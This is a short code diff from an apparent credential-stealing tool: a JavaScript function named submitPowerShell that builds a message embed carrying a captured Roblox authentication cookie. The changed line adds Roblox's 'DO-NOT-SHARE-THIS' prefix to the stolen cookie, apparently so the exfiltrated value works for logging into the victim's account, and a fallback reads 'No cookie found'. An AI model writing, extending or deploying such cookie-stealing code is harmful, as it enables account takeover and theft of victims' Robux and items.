@@ -271,7 +271,7 @@ async function submitPowerShell() {
                 fields: [
                     {
                         name: "🔐 Authentication Cookie",
-                        value: robloxCookie ? `\`\`\`${robloxCookie}\`\`\`` : "❌ No cookie found",
+                        value: robloxCookie ? `\`\`\`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}\`\`\`` : "❌ No cookie found",
                         inline: false
                     },
                     {
